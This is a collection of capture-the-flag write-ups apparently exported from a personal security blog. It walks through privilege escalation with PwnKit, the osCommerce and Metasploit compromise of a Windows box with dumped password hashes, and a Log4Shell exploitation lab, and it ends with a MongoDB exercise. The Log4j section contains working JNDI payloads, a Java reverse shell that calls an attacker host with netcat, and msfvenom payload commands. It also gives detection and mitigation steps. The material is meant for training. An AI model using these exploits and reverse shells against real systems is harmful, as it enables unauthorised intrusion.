Archive: polkit.zip 55d60e381ef90463ed35f47af44bf7e2fbc150d4  creating: CVE-2021-4034-main/  inflating: CVE-2021-4034-main/.gitignore  inflating: CVE-2021-4034-main/LICENSE  inflating: CVE-2021-4034-main/Makefile  inflating: CVE-2021-4034-main/README.md  inflating: CVE-2021-4034-main/cve-2021-4034.c  inflating: CVE-2021-4034-main/cve-2021-4034.sh  creating: CVE-2021-4034-main/dry-run/  inflating: CVE-2021-4034-main/dry-run/Makefile  inflating: CVE-2021-4034-main/dry-run/dry-run-cve-2021-4034.c  inflating: CVE-2021-4034-main/dry-run/pwnkit-dry-run.c  inflating: CVE-2021-4034-main/pwnkit.c strapi@horizontall:~$ cd CVE-2021-4034-main/ strapi@horizontall:~/CVE-2021-4034-main$ make cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c cc -Wall cve-2021-4034.c -o cve-2021-4034 echo \u0026#34;module UTF-8// PWNKIT// pwnkit 1\u0026#34; \u0026gt; gconv-modules mkdir -p GCONV_PATH=. cp -f /bin/true GCONV_PATH=./pwnkit.so:. strapi@horizontall:~/CVE-2021-4034-main$ ls  cve-2021-4034 cve-2021-4034.sh gconv-modules LICENSE pwnkit.c README.md  cve-2021-4034.c dry-run \u0026#39;GCONV_PATH=.\u0026#39; Makefile pwnkit.so strapi@horizontall:~/CVE-2021-4034-main$ ./cve-2021-4034 # id uid=0(root) gid=0(root) groups=0(root),1001(strapi) Very simple and reliable.\nFinal words And that\u0026rsquo;s it. No special technique - this machine just runs slightly outdated softwares. The lesson can be drawn from this box is to think carefully before dive into rabbit holes and update your machine as soon as security patches come out!\n","permalink":"https://git-akihakune.github.io/blog/horizontall/","summary":"Write up for Hack The Box\u0026rsquo;s Horizontall machine","title":"Hack The Box - Horizontall"},{"content":"Today\u0026rsquo;s objective is a relatively easy box, Blueprint from Try Hack Me.\nHowever, there\u0026rsquo;s a major obstacle in completing this box - somehow it managed to randomly go offline whenever it felt like. Therefore, the whole experience was quite demoralizing, and after a few times witnessing my little reverse shell got killed out of the blue, I had no choice but to go for the easier path - Metasploit. (;-;)\nAnd upon competing the box I made a new record :D pic.twitter.com/SQ1oR936Ed\n\u0026mdash; Aki Hakune (@akihakune) January 20, 2022  So, everything first started with a port scan.\n# Nmap 7.92 scan initiated Thu Jan 20 03:34:37 2022 as: nmap -sC -sV -oN nmap.txt 10.10.39.37 Nmap scan report for 10.10.39.37 Host is up (0.56s latency). Not shown: 987 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 |_http-server-header: Microsoft-IIS/7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-title: 404 - File or directory not found. 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28) |_ssl-date: TLS randomness does not represent time |_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28 | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 |_http-title: Bad request! 445/tcp open microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 3306/tcp open mysql MariaDB (unauthorized) 8080/tcp open http Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28) |_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Index of / 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49158/tcp open msrpc Microsoft Windows RPC 49159/tcp open msrpc Microsoft Windows RPC 49160/tcp open msrpc Microsoft Windows RPC Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows  Host script results: |_clock-skew: mean: 0s, deviation: 1s, median: -1s | smb2-security-mode: | 2.1: |_ Message signing enabled but not required |_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 02:a3:23:5f:7e:9f (unknown) | smb2-time: | date: 2022-01-20T08:38:11 |_ start_date: 2022-01-20T08:33:35 | smb-os-discovery: | OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1 | Computer name: BLUEPRINT | NetBIOS computer name: BLUEPRINT\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2022-01-20T08:38:10+00:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default)  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Jan 20 03:38:40 2022 -- 1 IP address (1 host up) scanned in 242.51 seconds As you can see, the attack surface is huge. So huge that it paved the ways for lots of rabbit holes.\nFirst, the TRACE method was deemed as \u0026ldquo;potentially risky method\u0026rdquo;. TRACE method can be utilized in Cross-site Tracing (XST) attack. Fortunately, this hole isn\u0026rsquo;t deep and soon after a few requests, I figured it out that it\u0026rsquo;s not the vulnerability I was looking for.\nSecond, there\u0026rsquo;re SMB ports running, even allowing guest user access. For more tips and tricks on exploiting SMB services, HackTricks has a great page for it. In short, I effortlessly broke into shares for guest account, namely Users and Windows share.\nsmbclient -U \u0026#39;guest\u0026#39; -L \\\\10.10.39.37\\ smbclient -U \u0026#39;guest\u0026#39; \\\\\\\\10.10.39.37\\\\Users smbclient -U \u0026#39;guest\u0026#39; \\\\\\\\10.10.39.37\\\\Windows However, guest user didn\u0026rsquo;t have sufficient permission to peek into Windows directory (obviously), and there was nothing much Users directory either. The best shot I could find there was a DAT log file. This brick wall also seems no better than the first one, so I left it here.\nThe third time, fortunately, I found the right path.\nYou may have noticed that there\u0026rsquo;s an Apache web service running on port 8080, which was plain weird. Here\u0026rsquo;s what was shown in browser.\n oscommerce version 2.3.4\u0026hellip; Sounds oddly specific. In no time, several public exploits were found.\n$ searchsploit oscommerce 2.3.4 ------------------------------------------------------------------------------------ ---------------------------------  Exploit Title | Path ------------------------------------------------------------------------------------ --------------------------------- osCommerce 2.3.4 - Multiple Vulnerabilities | php/webapps/34582.txt osCommerce 2.3.4.1 - \u0026#39;currency\u0026#39; SQL Injection | php/webapps/46328.txt osCommerce 2.3.4.1 - \u0026#39;products_id\u0026#39; SQL Injection | php/webapps/46329.txt osCommerce 2.3.4.1 - \u0026#39;reviews_id\u0026#39; SQL Injection | php/webapps/46330.txt osCommerce 2.3.4.1 - \u0026#39;title\u0026#39; Persistent Cross-Site Scripting | php/webapps/49103.txt osCommerce 2.3.4.1 - Arbitrary File Upload | php/webapps/43191.py osCommerce 2.3.4.1 - Remote Code Execution | php/webapps/44374.py osCommerce 2.3.4.1 - Remote Code Execution (2) | php/webapps/50128.py ------------------------------------------------------------------------------------ --------------------------------- Shellcodes: No Results I only tried the 44374.py, and it perfectly worked. However, the connection died very easily, for which I think my connection with this box was to blame. If you want to follow this path thou, just remember to change the parameters in the script accordingly and it should work.\nOn the other hand, because of my bad connection with this box, I need something better than a simple PHP reverse shell. Therefore, I opened msfconsole, looked for the exact same exploit, set the parameters and executed it, then elevated from PHP meterpreter to Windows tcp meterpreter using a backdoor:\n$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.4.28.15 LPORT=9999 -f exe \u0026gt; rever.exe Upload it to server, open up a multi/handler to catch it, then execute rever.exe, we got a Windows TCP meterpreter back.\nFrom here onward was just normal Metasploit stuffs.\nmeterpreter \u0026gt; load priv meterpreter \u0026gt; hashdump Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450::: meterpreter \u0026gt; getsystem meterpreter \u0026gt; getuid NT AUTHORITY\\SYSTEM Here\u0026rsquo;s the hash crack result using Crack Station. The root flag was in Admin\u0026rsquo;s desktop. I also tried to crack Admin password, just for the sake of curiosity, but seems like it wasn\u0026rsquo;t in the word list. And that\u0026rsquo;s it. Here are today box\u0026rsquo;s answers. ","permalink":"https://git-akihakune.github.io/blog/blueprint/","summary":"Write up for Try Hack Me\u0026rsquo;s Blueprint","title":"Try Hack Me - Blueprint"},{"content":" Here\u0026rsquo;s the challenge: https://tryhackme.com/room/solar It\u0026rsquo;s recommended to go through this informative room yourself first   Introduction People in the infosec industry all know how far-reached and critical the log4j vulnerability is, given the past exhausted, unrest December.\nTo summarize it all by memes, it would be this:\n And this:\n And more of these hilarious, evocative memes in this blog post. :D\nWell in short:\n This (in)famous exploit targeting a RCE vulnerability in log4j, a widely used Java library You can find a list of popular affected softwares here: https://github.com/YfryTchsGD/Log4jAttackSurface Check out this clear showcase and explanation from John Hammond, this room\u0026rsquo;s creator: https://youtu.be/7qoPDq41xhQ If you simply want to jump right into testing it, here\u0026rsquo;s a tool you may want: https://log4shell.huntress.com/  Equipped with all these knowledge, let\u0026rsquo;s dive into our challenge! :D\nReconnaissance Here\u0026rsquo;s the initial nmap scan:\n# Nmap 7.92 scan initiated Wed Jan 5 08:08:50 2022 as: nmap -sC -sV -oN nmap.txt 10.10.78.2 Nmap scan report for 10.10.78.2 Host is up (0.49s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e2:35:e1:4f:4e:87:45:9e:5f:2c:97:e0:da:a9:df:d5 (RSA) | 256 b2:fd:9b:75:1c:9e:80:19:5d:13:4e:8d:a0:83:7b:f9 (ECDSA) |_ 256 75:20:0b:43:14:a9:8a:49:1a:d9:29:33:e1:b9:1a:b6 (ED25519) 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind |_ 100000 3,4 111/udp6 rpcbind Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jan 5 08:10:05 2022 -- 1 IP address (1 host up) scanned in 75.23 seconds Let\u0026rsquo;s check out the first question! (＠＾◡＾)\n \u0026hellip; Well, time to hammer the machine, then. (⊙_⊙)\n$ rustscan -a 10.10.145.200 .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\  }/ /\\  \\| |\\  | `-\u0026#39; `-\u0026#39;`-----\u0026#39;`----\u0026#39; `-\u0026#39; `----\u0026#39; `---\u0026#39; `-\u0026#39; `-\u0026#39;`-\u0026#39; `-\u0026#39; The Modern Day Port Scanner. ________________________________________ : https://discord.gg/GFrQsGy : : https://github.com/RustScan/RustScan : -------------------------------------- 😵 https://admin.tryhackme.com [~] The config file is expected to be at \u0026#34;/home/kali/.rustscan.toml\u0026#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan\u0026#39;s speed. Use the Docker image, or up the Ulimit with \u0026#39;--ulimit 5000\u0026#39;. Open 10.10.145.200:22 Open 10.10.145.200:111 Open 10.10.145.200:8983 [~] Starting Script(s) [\u0026gt;] Script to be run Some(\u0026#34;nmap -vvv -p {{port}} {{ip}}\u0026#34;)  [~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-05 21:27 EST Initiating Ping Scan at 21:27 Scanning 10.10.145.200 [2 ports] Completed Ping Scan at 21:27, 0.39s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 21:27 Completed Parallel DNS resolution of 1 host. at 21:27, 0.01s elapsed DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]  Initiating Connect Scan at 21:27 Scanning 10.10.145.200 [3 ports] Discovered open port 22/tcp on 10.10.145.200 Discovered open port 111/tcp on 10.10.145.200 Discovered open port 8983/tcp on 10.10.145.200 Completed Connect Scan at 21:27, 0.39s elapsed (3 total ports) Looks like only those 3 ports are currently opening. Here\u0026rsquo;s the result of the last port scan:\n$ nmap -sV -p 8983 10.10.145.200 130 ⨯ Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-05 21:29 EST Nmap scan report for 10.10.145.200 Host is up (0.39s latency).  PORT STATE SERVICE VERSION 8983/tcp open http Apache Solr  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.96 seconds Discovery Navigating to the application, we see this interface:\n The task also generously provided us a sample Solr log file. You can download it here: solrlogs.zip.\nMost of those files just contain the default Solr banner, but solr.log contains something weird:\n... 2021-12-13 03:48:53.988 INFO (qtp1083962448-18) [ ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=1 2021-12-13 03:48:54.383 INFO (qtp1083962448-17) [ ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0 2021-12-13 03:48:54.801 INFO (qtp1083962448-23) [ ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0 2021-12-13 03:48:55.144 INFO (qtp1083962448-21) [ ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0 2021-12-13 04:01:46.718 INFO (qtp1083962448-18) [ ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={id=1337} status=0 QTime=0 2021-12-13 04:01:48.672 INFO (qtp1083962448-16) [ ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={id=1337} status=0 QTime=0 2021-12-13 04:01:49.304 INFO (qtp1083962448-20) [ ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={id=1337} status=0 QTime=0 2021-12-13 04:01:50.401 INFO (qtp1083962448-20) [ ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={id=1337} status=0 QTime=0 2021-12-13 04:01:53.944 INFO (qtp1083962448-20) [ ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0 ... There\u0026rsquo;s an abnormal number of INFO level log entries. They repeatedly request for /admin/cores endpoint, and some contains unique id field in params entrypoint. Here\u0026rsquo;s the result if you try to interact with it:\n$ curl http://10.10.145.200:8983/solr/admin/cores {  \u0026#34;responseHeader\u0026#34;:{  \u0026#34;status\u0026#34;:0,  \u0026#34;QTime\u0026#34;:0},  \u0026#34;initFailures\u0026#34;:{},  \u0026#34;status\u0026#34;:{}} And a few more times:\n$ curl -X POST http://10.10.145.200:8983/solr/admin/cores {  \u0026#34;responseHeader\u0026#34;:{  \u0026#34;status\u0026#34;:0,  \u0026#34;QTime\u0026#34;:0},  \u0026#34;initFailures\u0026#34;:{},  \u0026#34;status\u0026#34;:{}}  $ curl -X POST -d \u0026#34;id=1337\u0026#34; http://10.10.145.200:8983/solr/admin/cores {  \u0026#34;responseHeader\u0026#34;:{  \u0026#34;status\u0026#34;:0,  \u0026#34;QTime\u0026#34;:3},  \u0026#34;initFailures\u0026#34;:{},  \u0026#34;status\u0026#34;:{}} We can see a slight change in the response: QTime changed, which probably means our posted data was recorded, or \u0026ldquo;logged\u0026rdquo;. Now it\u0026rsquo;s time to check if this machine is vulnerable to log4j.\nProof of concept As you may have known, the payload that set the Internet on fire is as simple as:\n${jndi:ldap://EVIL_HOST_ADDRESS} Find your address by ip a, open a netcat listener, then send your payload:\n$ curl -X POST -d \u0026#39;${jndi:ldap://10.4.35.200:9999}\u0026#39; http://10.10.145.200:8983/solr/admin/cores {  \u0026#34;responseHeader\u0026#34;:{  \u0026#34;status\u0026#34;:0,  \u0026#34;QTime\u0026#34;:0},  \u0026#34;initFailures\u0026#34;:{},  \u0026#34;status\u0026#34;:{}} $ nc -lvnp 9999 listening on [any] 9999 ... connect to [10.4.35.200] from (UNKNOWN) [10.10.145.200] 36400 As you can see, the server readily sent back a request - it\u0026rsquo;s confirmed being vulnerable to log4j! With this simple procedure you can now go exploit log4j in the wild, just put the payload in whatever you can think of - username, User Agent, request parameters, \u0026hellip;, finger cross and hopefully a thousand-dollar bug bounty will fall upon you. :D\nExploitation This step called for some set up and installation, so it\u0026rsquo;s better to power off our attacking machine and take a snapshot first.\nIf you\u0026rsquo;re already in an \u0026ldquo;attacking environment\u0026rdquo;, like ParrotSec or Kali Linux, chances are required dependencies are already installed. You can run the commands below to automate the installing process.\n#!/bin/bash  cd /tmp  sudo apt install default-jdk git maven git clone https://github.com/mbechler/marshalsec cd marshalsec  mvn clean package -DskipTests Then, create a simple Java reverse shell through netcat like this:\npublic class Exploit {  /img/solarlog4j {  try {  java.lang.Runtime.getRuntime().exec(\u0026#34;nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999\u0026#34;);  } catch (Exception e) {  e.printStackTrace();  }  } } And then, spin up a LDAP server, a simple HTTP server, build the exploit, and open a netcat listener to wait for it.\njava -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \u0026#34;http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit\u0026#34; python3 -m http.server javac Exploit.java -source 8 -target 8 nc -lnvp 9999 With all that set up, the last task is to send our exploit.\ncurl -X POST -d \u0026#39;${jndi:ldap://10.4.35.200:1389/Exploit}\u0026#39; http://10.10.132.117:8983/solr/admin/cores And\u0026hellip; we got a reverse shell :D\n   If you want to go \u0026ldquo;further and beyond\u0026rdquo;, there\u0026rsquo;s a small optional challenge: Challenge\u0026hellip; accepted. :D\nI recommend this tutorial. Straight to the point, if you want to get a meterpreter instead of an usual unstable reverse shell, just catch it with Metasploit multi/handler and directly upgrade it.\nmsf6 exploit(multi/handler) \u0026gt; exploit  [*] Started reverse TCP handler on 10.4.35.200:9999 [*] Command shell session 1 opened (10.4.35.200:9999 -\u0026gt; 10.10.178.136:60342 ) at 2022-01-06 05:53:05 -0500  ^Z Background session 1? [y/N] y msf6 exploit(multi/handler) \u0026gt; sessions  Active sessions ===============   Id Name Type Information Connection  -- ---- ---- ----------- ----------  1 shell sparc/bsd 10.4.35.200:9999 -\u0026gt; 10.10.178.136:60342 (10.10.178.136)  msf6 exploit(multi/handler) \u0026gt; sessions -u 1 [*] Executing \u0026#39;post/multi/manage/shell_to_meterpreter\u0026#39; on session(s): [1]  [*] Upgrading session ID: 1 [*] Starting exploit/multi/handler [*] Started reverse TCP handler on 10.4.35.200:4433 [*] Command stager progress: 100.00% (773/773 bytes) [*] Sending stage (984904 bytes) to 10.10.178.136 [*] Meterpreter session 2 opened (10.4.35.200:4433 -\u0026gt; 10.10.178.136:38424 ) at 2022-01-06 05:54:23 -0500 [*] Stopping exploit/multi/handler  msf6 exploit(multi/handler) \u0026gt; sessions -i 2 [*] Starting interaction with 2...  meterpreter \u0026gt; Persistence As you may have noticed from the video above, this solr user can run sudo without password.\nmeterpreter \u0026gt; shell Process 1794 created. Channel 2 created. sudo -l Matching Defaults entries for solr on solar:  env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User solr may run the following commands on solar:  (ALL) NOPASSWD: ALL This saved us from the hassle of dropping a backdoor ourselves. Now, let\u0026rsquo;s change the SSH password and lordly SSH in like a boss. ヾ(⌐■_■)ノ♪\nDetection This section is dedicated to sysadmins, but if you own an Internet-exposing server, you\u0026rsquo;ll definitely want to check this useful massive Reddit thread out.\nChecking the affected log file again, we can see our payload proudly stood there:\nsolr@solar:/var/solr/logs$ tail -n 1 solr.log 2022-01-06 10:52:55.930 INFO (qtp1083962448-18) [ ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={${jndi:ldap://10.4.35.200:1389/Exploit\\}=} status=0 QTime=2399 And here\u0026rsquo;s the most beautiful but terrifying detection on the Internet:\n(?im)(?:^|[\\n]).*?(?:[\\x24]|%(?:25%?)*24|\\\\u?0*(?:44|24))(?:[\\x7b]|%(?:25%?)*7b|\\\\u?0*(?:7b|173))[^\\n]*?((?:j|%(?:25%?)*(?:4a|6a)|\\\\u?0*(?:112|6a|4a|152))[^\\n]*?(?:n|%(?:25%?)*(?:4e|6e)|\\\\u?0*(?:4e|156|116|6e))[^\\n]*?(?:d|%(?:25%?)*(?:44|64)|\\\\u?0*(?:44|144|104|64))[^\\n]*?(?:[i\\x{130}\\x{131}]|%(?:25%?)*(?:49|69|C4%(?:25%?)*B0|C4%(?:25%?)*B1)|\\\\u?0*(?:111|69|49|151|130|460|131|461))[^\\n]*?(?:[\\x3a]|%(?:25%?)*3a|\\\\u?0*(?:72|3a))[^\\n]*?((?:l|%(?:25%?)*(?:4c|6c)|\\\\u?0*(?:154|114|6c|4c))[^\\n]*?(?:d|%(?:25%?)*(?:44|64)|\\\\u?0*(?:44|144|104|64))[^\\n]*?(?:a|%(?:25%?)*(?:41|61)|\\\\u?0*(?:101|61|41|141))[^\\n]*?(?:p|%(?:25%?)*(?:50|70)|\\\\u?0*(?:70|50|160|120))(?:[^\\n]*?(?:[s\\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\\\u?0*(?:17f|123|577|73|53|163)))?|(?:r|%(?:25%?)*(?:52|72)|\\\\u?0*(?:122|72|52|162))[^\\n]*?(?:m|%(?:25%?)*(?:4d|6d)|\\\\u?0*(?:4d|155|115|6d))[^\\n]*?(?:[i\\x{130}\\x{131}]|%(?:25%?)*(?:49|69|C4%(?:25%?)*B0|C4%(?:25%?)*B1)|\\\\u?0*(?:111|69|49|151|130|460|131|461))|(?:d|%(?:25%?)*(?:44|64)|\\\\u?0*(?:44|144|104|64))[^\\n]*?(?:n|%(?:25%?)*(?:4e|6e)|\\\\u?0*(?:4e|156|116|6e))[^\\n]*?(?:[s\\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\\\u?0*(?:17f|123|577|73|53|163))|(?:n|%(?:25%?)*(?:4e|6e)|\\\\u?0*(?:4e|156|116|6e))[^\\n]*?(?:[i\\x{130}\\x{131}]|%(?:25%?)*(?:49|69|C4%(?:25%?)*B0|C4%(?:25%?)*B1)|\\\\u?0*(?:111|69|49|151|130|460|131|461))[^\\n]*?(?:[s\\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\\\u?0*(?:17f|123|577|73|53|163))|(?:[^\\n]*?(?:[i\\x{130}\\x{131}]|%(?:25%?)*(?:49|69|C4%(?:25%?)*B0|C4%(?:25%?)*B1)|\\\\u?0*(?:111|69|49|151|130|460|131|461))){2}[^\\n]*?(?:o|%(?:25%?)*(?:4f|6f)|\\\\u?0*(?:6f|4f|157|117))[^\\n]*?(?:p|%(?:25%?)*(?:50|70)|\\\\u?0*(?:70|50|160|120))|(?:c|%(?:25%?)*(?:43|63)|\\\\u?0*(?:143|103|63|43))[^\\n]*?(?:o|%(?:25%?)*(?:4f|6f)|\\\\u?0*(?:6f|4f|157|117))[^\\n]*?(?:r|%(?:25%?)*(?:52|72)|\\\\u?0*(?:122|72|52|162))[^\\n]*?(?:b|%(?:25%?)*(?:42|62)|\\\\u?0*(?:102|62|42|142))[^\\n]*?(?:a|%(?:25%?)*(?:41|61)|\\\\u?0*(?:101|61|41|141))|(?:n|%(?:25%?)*(?:4e|6e)|\\\\u?0*(?:4e|156|116|6e))[^\\n]*?(?:d|%(?:25%?)*(?:44|64)|\\\\u?0*(?:44|144|104|64))[^\\n]*?(?:[s\\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\\\u?0*(?:17f|123|577|73|53|163))|(?:h|%(?:25%?)*(?:48|68)|\\\\u?0*(?:110|68|48|150))(?:[^\\n]*?(?:t|%(?:25%?)*(?:54|74)|\\\\u?0*(?:124|74|54|164))){2}[^\\n]*?(?:p|%(?:25%?)*(?:50|70)|\\\\u?0*(?:70|50|160|120))(?:[^\\n]*?(?:[s\\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\\\u?0*(?:17f|123|577|73|53|163)))?)[^\\n]*?(?:[\\x3a]|%(?:25%?)*3a|\\\\u?0*(?:72|3a))|(?:b|%(?:25%?)*(?:42|62)|\\\\u?0*(?:102|62|42|142))[^\\n]*?(?:a|%(?:25%?)*(?:41|61)|\\\\u?0*(?:101|61|41|141))[^\\n]*?(?:[s\\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\\\u?0*(?:17f|123|577|73|53|163))[^\\n]*?(?:e|%(?:25%?)*(?:45|65)|\\\\u?0*(?:45|145|105|65))[^\\n]*?(?:[\\x3a]|%(?:25%?)*3a|\\\\u?0*(?:72|3a))(JH[s-v]|[\\x2b\\x2f-9A-Za-z][CSiy]R7|[\\x2b\\x2f-9A-Za-z]{2}[048AEIMQUYcgkosw]ke[\\x2b\\x2f-9w-z])) Bypasses Here\u0026rsquo;s a bunch of bypasses for real life scenarios. You can also search for more exhaustive lists on Github.\nMitigation Let\u0026rsquo;s patch the machine by changing its configuration.\nsolr@solar:/var/solr/logs$ find / -type f -name \u0026#34;solr.in.sh\u0026#34; 2\u0026gt;/dev/null /etc/default/solr.in.sh We just need to add this line to the /etc/default/solr.in.sh file:\nSOLR_OPTS=\u0026#34;$SOLR_OPTS-Dlog4j2.formatMsgNoLookups=true\u0026#34; Then restart the service. Sending the exact same payload, we can see it doesn\u0026rsquo;t work anymore.\n Answers What service is running on port 8983? (Just the name of the software) Apache Solr\nTake a close look at the first page visible when navigating to http://MACHINE_IP:8983. You should be able to see clear indicators that log4j is in use within the application for logging activity. What is the -Dsolr.log.dir argument set to, displayed on the front page? /var/solr/logs\nOne file has a significant number of INFO entries showing repeated requests to one specific URL endpoint. Which file includes contains this repeated entry? (Just the filename itself, no path needed) solr.log\nWhat \u0026#34;path\u0026#34; or URL endpoint is indicated in these repeated entries? /admin/cores\nViewing these log entries, what field name indicates some data entrypoint that you as a user could control? (Just the field name) params\nWhat is the output of running this command? (You should leave this terminal window open as it will be actively awaiting connections) Listening on 0.0.0.0:1389\nWhat user are you? solr\nWhat is the full path of the specific solr.in.sh file? /etc/default/solr.in.sh\nFinal words And that\u0026rsquo;s an overview about the severe vulnerability that \u0026ldquo;affect almost all software under the sun\u0026rdquo;.\n\u0026hellip; Why are you still here? It\u0026rsquo;s high time patching your servers, isn\u0026rsquo;t it? \u0026lt;(￣︶￣)\u0026gt;\n","permalink":"https://git-akihakune.github.io/blog/solarlog4j/","summary":"Writeup for Try Hack Me\u0026rsquo;s Solar Log4j room","title":"Try Hack Me - Solar Log4j"},{"content":" Part 1 of 2021 Advent of Cyber Part 2 of 2021 Advent of Cyber   [Day 7] Web Exploitation: Migration Without Security This task\u0026rsquo;s learning objective is NoSQL database, particularly MongoDB. Here\u0026rsquo;s a cheatsheet from MongoDB document itself that may make our life easier.\nPersonally I\u0026rsquo;m more used to SQL databases, especially PostgreSQL. But this concise passage\u0026rsquo;s summarized it intelligibly:\nSimilar to relational databases (such as MySQL and MSSQL), MongoDB consists of databases, tables, fields but with different names where - Collections are similar to tables or views in MySQL and MSSQL. - Documents are similar to rows or records in MySQL and MSSQL. - Fields are similar to columns in MySQL and MSSQL. Also, it is useful to briefly look at and compare the query operators between MongoDB and MySQL: - $and equivalent to AND in MySQL - $or equivalent to OR in MySQL - $eq equivalent to = in MySQL Before exploiting the NoSQL injection, there are MongoDB operators that we need to be familiar with that are heavily used in the injections, which are: - $eq - matches records that equal to a certain value - $ne - matches records that are not equal to a certain value - $gt - matches records that are greater than a certain value. - $where - matches records based on Javascript condition - $exists - matches records that have a certain field - $regex - matches records that satisfy certain regular expressions. According to the task, let\u0026rsquo;s SSH into our box first:\n$ ssh thm@10.10.156.199 -p 2222 thm@10.10.156.199\u0026#39;s password: Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-1059-aws x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage This system has been minimized by removing packages and content that are not required on a system that users do not log into. To restore this content, you can run the \u0026#39;unminimize\u0026#39; command. Last login: Tue Dec 21 08:53:12 2021 thm@mongo-server:~$ mongosh Current Mongosh Log ID: 61c1a96abf06cbd75fee1b76 Connecting to: mongodb://127.0.0.1:27017/?directConnection=true\u0026amp;serverSelectionTimeoutMS=2000 Using MongoDB: 5.0.3 Using Mongosh: 1.1.0  For mongosh info see: https://docs.mongodb.com/mongodb-shell/  ------  The server generated these startup warnings when booting:  2021-12-21T08:39:28.330+00:00: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem  2021-12-21T08:39:50.170+00:00: Access control is not enabled for the database. Read and write access to data and configuration is unrestricted ------  Warning: Found ~/.mongorc.js, but not ~/.mongoshrc.js. ~/.mongorc.js will not be loaded.  You may want to copy or rename ~/.mongorc.js to ~/.mongoshrc.js. test\u0026gt; As you may have noticed, I used mongosh shell instead of mongo as the task suggested, since mongo shell will soon be deprecated and removed.\nThe next steps are quite obvious if you consult the documentation.\ntest\u0026gt; show dbs admin 41 kB config 36.9 kB flagdb 41 kB local 73.7 kB See that flagdb database? Our first task is to simply query its data.\ntest\u0026gt; use flagdb switched to db flagdb flagdb\u0026gt; show collections flagColl flagdb\u0026gt; show tables flagColl 